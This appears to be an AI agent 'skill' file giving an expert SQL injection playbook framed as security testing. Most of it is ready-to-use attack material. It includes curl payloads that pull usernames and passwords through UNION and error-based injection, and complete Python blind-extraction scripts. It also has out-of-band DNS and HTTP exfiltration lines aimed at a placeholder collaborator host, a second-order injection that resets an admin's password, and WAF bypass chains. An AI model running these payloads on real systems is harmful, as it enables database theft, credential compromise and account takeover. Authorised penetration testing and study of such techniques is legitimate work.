---
name: sql-injection
description: SQL injection testing covering union, error-based, blind, second-order, filter bypass chains, and ORM-specific exploitation with ready-to-use extraction scripts
---

# SQL Injection — Expert-Level Testing

SQLi remains the most durable and impactful vulnerability class. This skill covers standard detection AND advanced exploitation: blind extraction with Python scripts, second-order injection, WAF bypass chains, conditional responses, and ORM-specific attack patterns.

## Step 1: Detect SQL Injection

```bash
# 1. Send canary to every parameter — look for errors, behavior changes, or timing diffs
# Error-based detection
curl -sk "https://TARGET/page?id=1'" | grep -iE "sql|syntax|mysql|postgres|oracle|microsoft|ORA-|ODBC|sqlite|mariadb|warning|error"
curl -sk "https://TARGET/page?id=1%27" | grep -iE "sql|syntax|mysql|postgres"

# Boolean-based detection (compare responses)
curl -sk "https://TARGET/page?id=1 AND 1=1" -o true.html
curl -sk "https://TARGET/page?id=1 AND 1=2" -o false.html
diff true.html false.html  # Different output = boolean-based SQLi

# Time-based detection
time curl -sk "https://TARGET/page?id=1' AND SLEEP(5)--+-"     # MySQL
time curl -sk "https://TARGET/page?id=1';SELECT pg_sleep(5)--" # PostgreSQL
time curl -sk "https://TARGET/page?id=1';WAITFOR DELAY '0:0:5'--" # MSSQL

# Different injection points
curl -sk "https://TARGET/page" -X POST -d "username=admin'&password=test"
curl -sk "https://TARGET/page" -H "X-Forwarded-For: 1' AND 1=1--"
curl -sk "https://TARGET/page" -H "Cookie: session=1' AND 1=1--"
curl -sk "https://TARGET/page" -H "Referer: https://TARGET/' AND 1=1--"
curl -sk "https://TARGET/page" -H "User-Agent: Mozilla/5.0' AND 1=1--"
```

## Step 2: Determine Database Type

```bash
# MySQL/MariaDB
curl -sk "https://TARGET/page?id=1' AND @@version--+-" | grep -iE "[0-9]+\.[0-9]"
curl -sk "https://TARGET/page?id=1' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1--+-"

# PostgreSQL
curl -sk "https://TARGET/page?id=1' AND version()::text LIKE '%Postgres%'--"
curl -sk "https://TARGET/page?id=1'; SELECT current_database()--"

# MSSQL
curl -sk "https://TARGET/page?id=1' AND @@version LIKE '%Microsoft%'--"
curl -sk "https://TARGET/page?id=1'; SELECT db_name()--"

# Oracle
curl -sk "https://TARGET/page?id=1' AND (SELECT banner FROM v\$version WHERE ROWNUM=1) IS NOT NULL--"

# SQLite
curl -sk "https://TARGET/page?id=1' AND sqlite_version() IS NOT NULL--"
```

## Step 3: UNION-Based Extraction

```bash
# Step 3a: Determine column count
curl -sk "https://TARGET/page?id=1' ORDER BY 1--+-"  # OK
curl -sk "https://TARGET/page?id=1' ORDER BY 2--+-"  # OK
curl -sk "https://TARGET/page?id=1' ORDER BY 3--+-"  # OK
curl -sk "https://TARGET/page?id=1' ORDER BY 4--+-"  # Error → 3 columns

# Step 3b: Find displayable column
curl -sk "https://TARGET/page?id=-1' UNION SELECT 'a','b','c'--+-"
# Whichever letter appears in the response is the display column

# Step 3c: Extract data
# MySQL
curl -sk "https://TARGET/page?id=-1' UNION SELECT 1,@@version,3--+-"
curl -sk "https://TARGET/page?id=-1' UNION SELECT 1,database(),3--+-"
curl -sk "https://TARGET/page?id=-1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--+-"
curl -sk "https://TARGET/page?id=-1' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--+-"
curl -sk "https://TARGET/page?id=-1' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users--+-"

# PostgreSQL
curl -sk "https://TARGET/page?id=-1' UNION SELECT 1,version(),3--"
curl -sk "https://TARGET/page?id=-1' UNION SELECT 1,current_database(),3--"
curl -sk "https://TARGET/page?id=-1' UNION SELECT 1,string_agg(table_name,','),3 FROM information_schema.tables WHERE table_schema='public'--"
curl -sk "https://TARGET/page?id=-1' UNION SELECT 1,string_agg(column_name,','),3 FROM information_schema.columns WHERE table_name='users'--"
curl -sk "https://TARGET/page?id=-1' UNION SELECT 1,username||':'||password,3 FROM users--"

# MSSQL
curl -sk "https://TARGET/page?id=-1' UNION SELECT 1,@@version,3--"
curl -sk "https://TARGET/page?id=-1' UNION SELECT 1,db_name(),3--"
curl -sk "https://TARGET/page?id=-1' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--"
curl -sk "https://TARGET/page?id=-1' UNION SELECT 1,name,3 FROM syscolumns WHERE id=OBJECT_ID('users')--"
```

## Step 4: Blind Boolean-Based Extraction (Self-Contained Python Script)

**Use this when UNION is blocked and no error output is visible:**

```python
#!/usr/bin/env python3
"""Blind boolean-based SQL injection data extractor.
Extracts data one character at a time using binary search."""

import requests, sys, string, urllib3
urllib3.disable_warnings()

TARGET = "https://TARGET/page"
PARAM = "id"
TRUE_INDICATOR = "Welcome"  # String that appears in TRUE responses
# ADJUST THESE:
# - Change TARGET, PARAM, and TRUE_INDICATOR to match your target
# - Change the SQL payload template below

def check(condition):
    """Send request with boolean condition, return True if condition is true"""
    payload = f"1' AND ({condition})-- -"
    r = requests.get(TARGET, params={PARAM: payload}, verify=False, timeout=10)
    return TRUE_INDICATOR in r.text

def extract_char(position, query):
    """Extract single character using binary search"""
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        if check(f"ASCII(SUBSTRING(({query}),{position},1))>{mid}"):
            low = mid + 1
        else:
            high = mid
    return chr(low) if low > 32 else None

def extract_string(query, max_length=100):
    """Extract full string from SQL query"""
    result = ""
    for i in range(1, max_length + 1):
        char = extract_char(i, query)
        if char is None:
            break
        result += char
        print(f"\r[*] Extracting: {result}", end="", flush=True)
    print()
    return result

# --- EXTRACTION ---
print("[*] Extracting database version...")
version = extract_string("SELECT @@version")  # MySQL
# version = extract_string("SELECT version()")  # PostgreSQL
print(f"[+] Version: {version}")

print("[*] Extracting database name...")
dbname = extract_string("SELECT database()")  # MySQL
# dbname = extract_string("SELECT current_database()")  # PostgreSQL
print(f"[+] Database: {dbname}")

print("[*] Extracting table names...")
tables = extract_string("SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()")
print(f"[+] Tables: {tables}")

# Extract specific table data
for table in tables.split(","):
    print(f"\n[*] Extracting columns from {table}...")
    cols = extract_string(f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}'")
    print(f"[+] Columns: {cols}")
```

## Step 5: Blind Time-Based Extraction (Self-Contained Python Script)

**Use this when NO visible difference between true/false responses:**

```python
#!/usr/bin/env python3
"""Time-based blind SQL injection data extractor.
Uses response timing as the only oracle."""

import requests, time, sys, urllib3
urllib3.disable_warnings()

TARGET = "https://TARGET/page"
PARAM = "id"
DELAY = 3  # seconds
THRESHOLD = DELAY - 0.5  # minimum response time to consider "true"

def check_time(condition):
    """Send time-based payload, return True if response is delayed"""
    # MySQL
    payload = f"1' AND IF(({condition}),SLEEP({DELAY}),0)-- -"
    # PostgreSQL
    # payload = f"1' AND CASE WHEN ({condition}) THEN pg_sleep({DELAY}) ELSE pg_sleep(0) END-- -"
    # MSSQL
    # payload = f"1' AND CASE WHEN ({condition}) THEN WAITFOR DELAY '0:0:{DELAY}' END-- -"
    
    start = time.time()
    try:
        requests.get(TARGET, params={PARAM: payload}, verify=False, timeout=DELAY+5)
    except requests.Timeout:
        return True
    elapsed = time.time() - start
    return elapsed >= THRESHOLD

def extract_char_time(position, query):
    """Extract single character using binary search with timing"""
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        if check_time(f"ASCII(SUBSTRING(({query}),{position},1))>{mid}"):
            low = mid + 1
        else:
            high = mid
    return chr(low) if low > 32 else None

def extract_string_time(query, max_length=50):
    """Extract full string from SQL query using timing"""
    result = ""
    for i in range(1, max_length + 1):
        char = extract_char_time(i, query)
        if char is None:
            break
        result += char
        print(f"\r[*] Extracting: {result}", end="", flush=True)
    print()
    return result

print("[*] Time-based blind SQLi extraction")
print("[*] Extracting database name...")
db = extract_string_time("SELECT database()")
print(f"[+] Database: {db}")
```

## Step 6: Out-of-Band (OOB) Extraction

```bash
# MySQL OOB via DNS
curl -sk "https://TARGET/page?id=1' AND LOAD_FILE(CONCAT('\\\\\\\\',database(),'.COLLABORATOR.oastify.com\\\\a'))--+-"

# MSSQL OOB via DNS
curl -sk "https://TARGET/page?id=1'; EXEC master..xp_dirtree '\\\\\\\\'+db_name()+'.COLLABORATOR.oastify.com\\\\a'--"

# PostgreSQL OOB (requires dblink extension)
curl -sk "https://TARGET/page?id=1'; SELECT dblink_send_query('host=COLLABORATOR.oastify.com user='||current_database()||' password=x dbname=d','SELECT 1')--"

# Oracle OOB via HTTP
curl -sk "https://TARGET/page?id=1' AND UTL_HTTP.REQUEST('http://COLLABORATOR.oastify.com/'||SYS.DATABASE_NAME)--"
```

## Step 7: Error-Based Extraction

```bash
# MySQL (extractvalue/updatexml)
curl -sk "https://TARGET/page?id=1' AND extractvalue(1,CONCAT(0x7e,version()))--+-"
curl -sk "https://TARGET/page?id=1' AND updatexml(1,CONCAT(0x7e,version()),1)--+-"
curl -sk "https://TARGET/page?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+-"

# PostgreSQL (CAST error)
curl -sk "https://TARGET/page?id=1' AND 1=CAST(version() AS int)--"

# MSSQL (CONVERT error)
curl -sk "https://TARGET/page?id=1' AND 1=CONVERT(int,@@version)--"

# Oracle (XMLType error)
curl -sk "https://TARGET/page?id=1' AND (SELECT XMLType('<:'||user||'>') FROM dual) IS NOT NULL--"
```

## Step 8: Second-Order SQL Injection

```bash
# Input is stored safely, then used unsafely in a DIFFERENT query later
# Example: Register with malicious username, trigger when username is used in queries

# Step 1: Store payload via registration/profile update
curl -sk "https://TARGET/register" -X POST \
  -d "username=admin'-- -&password=test&email=test@test.com"

# Step 2: Trigger the injection via a different action that uses the stored value
curl -sk "https://TARGET/change-password" -X POST \
  -H "Cookie: session=YOUR_SESSION" \
  -d "new_password=hacked"
# If password change query does: UPDATE users SET password='hacked' WHERE username='admin'-- -'
# This changes the ADMIN's password

# Another example: stored payload triggers in search/export/report
curl -sk "https://TARGET/profile" -X PUT \
  -d '{"name":"test' UNION SELECT password FROM users--"}'
# Later when admin views user list → SQL query uses stored name unsafely
```

## Step 9: Filter Bypass Techniques

### Keyword Bypass

```bash
# Space blocked → use comments or tabs
curl -sk "https://TARGET/page?id=1'/**/AND/**/1=1--"
curl -sk "https://TARGET/page?id=1'%09AND%091=1--"
curl -sk "https://TARGET/page?id=1'%0aAND%0a1=1--"

# UNION/SELECT blocked → case variation or inline comments
curl -sk "https://TARGET/page?id=-1'%20UnIoN%20SeLeCt%201,2,3--"
curl -sk "https://TARGET/page?id=-1'%20/*!50000UNION*//*!50000SELECT*/%201,2,3--"
curl -sk "https://TARGET/page?id=-1'%20uNiOn%20aLl%20sElEcT%201,2,3--"

# Single quotes blocked → use hex or char() 
curl -sk "https://TARGET/page?id=-1 UNION SELECT 1,CONCAT(username,0x3a,password),3 FROM users--"
curl -sk "https://TARGET/page?id=-1 UNION SELECT 1,username,3 FROM users WHERE username=CHAR(97,100,109,105,110)--"

# AND/OR blocked → use && or ||
curl -sk "https://TARGET/page?id=1'%26%26'1'='1"
curl -sk "https://TARGET/page?id=1'||'1'='1"

# = blocked → use LIKE or IN or BETWEEN
curl -sk "https://TARGET/page?id=1' AND 1 LIKE 1--"
curl -sk "https://TARGET/page?id=1' AND 1 IN (1)--"
curl -sk "https://TARGET/page?id=1' AND 1 BETWEEN 0 AND 2--"

# Double URL encoding
curl -sk "https://TARGET/page?id=1%2527%2520AND%25201%253D1--"

# HTTP parameter pollution
curl -sk "https://TARGET/page?id=1&id=' UNION SELECT 1,2,3--"
```

### WAF Bypass — Advanced

```bash
# JSON content type bypass (some WAFs only inspect URL params)
curl -sk "https://TARGET/api/search" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"test'\'' UNION SELECT 1,@@version,3-- -"}'

# Multipart bypass
curl -sk "https://TARGET/api/search" -X POST \
  -H "Content-Type: multipart/form-data; boundary=----FormBoundary" \
  -d '------FormBoundary
Content-Disposition: form-data; name="id"

1'"'"' UNION SELECT 1,@@version,3--
------FormBoundary--'

# Chunked transfer encoding
printf 'POST /page HTTP/1.1\r\nHost: TARGET\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nid=1'\''%20\r\n1a\r\nUNION%20SELECT%201,@@version,3\r\n0\r\n\r\n' | ncat TARGET 443 --ssl

# HPP (HTTP Parameter Pollution) — different frameworks handle duplicates differently
curl -sk "https://TARGET/page?id=1'/*&id=*/UNION/*&id=*/SELECT/*&id=*/1,2,3--"
```

## Step 10: ORM and Framework-Specific Injection

```bash
# Django ORM — order_by injection
curl -sk "https://TARGET/api/users?ordering=username);--"
curl -sk "https://TARGET/api/users?ordering=CASE WHEN (SELECT 1)=1 THEN username ELSE id END"

# Ruby on Rails — where clause injection  
curl -sk "https://TARGET/api/users?search[name]=test' OR 1=1--"
curl -sk "https://TARGET/api/users?q[username_cont]=test' OR '1'='1"

# Laravel Eloquent — whereRaw injection
curl -sk "https://TARGET/api/search" -X POST \
  -H "Content-Type: application/json" \
  -d '{"filter":"1=1) UNION SELECT 1,password FROM users WHERE (1=1"}'

# Node.js Sequelize — operator injection
curl -sk "https://TARGET/api/users" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":{"$like":"%admin%"}}'
```

## Testing Methodology

1. **Identify all input points** — URL params, POST body, headers, cookies, JSON, XML
2. **Send error-triggering canaries** — single quote, double quote, backslash, parentheses
3. **Determine database type** — from error messages or blind probing
4. **Classify injection type** — in-band (UNION/error), blind (boolean/time), or OOB
5. **Attempt UNION extraction** — find column count, display column, extract data
6. **If UNION blocked** — switch to error-based or blind extraction scripts (Step 4/5)
7. **If time-based only** — use Python script with binary search for efficient extraction
8. **If WAF present** — apply filter bypass chains from Step 9
9. **Test second-order** — store payloads via one endpoint, trigger via another
10. **Extract high-value data** — credentials, tokens, admin emails, then attempt privilege escalation

## Validation

1. Show controlled extraction of verifiable data (database version, current user)
2. Extract actual table data (credentials, user records) with reproducible requests
3. Demonstrate WAF bypass if present (show blocked vs bypassed payloads)
4. Provide CVSS vector matching the impact (data access = High, auth bypass = Critical)

## Impact

- **Critical**: Full database dump, authentication bypass, RCE via file write or xp_cmdshell
- **High**: Data extraction of PII/credentials, privilege escalation
- **Medium**: Limited data extraction (own data only), information disclosure
- **Low**: Error-based information leakage without data extraction

## Pro Tips

1. **Binary search is 7x faster** than linear character extraction — always use it for blind SQLi
2. **Error-based > Boolean-based > Time-based** — choose the fastest oracle available
3. **OAST/DNS exfiltration** — fastest for large data sets, works through most WAFs
4. **Second-order SQLi** — most scanners miss this entirely; always test stored values
5. **JSON body bypasses most WAFs** — WAFs often only inspect URL query strings
6. **ORDER BY injection** — use CASE WHEN for boolean channels when WHERE clause isn't injectable
7. **GROUP_CONCAT** (MySQL) and **string_agg** (PostgreSQL) — extract all rows in one query
8. **`information_schema`** — works on MySQL, PostgreSQL, MSSQL; use `all_tables` for Oracle
9. **Write the extraction script as a complete Python file** — save it and run it, don't iterate manually
10. **Always try multiple injection points** — headers (X-Forwarded-For, Referer, User-Agent) are often unprotected
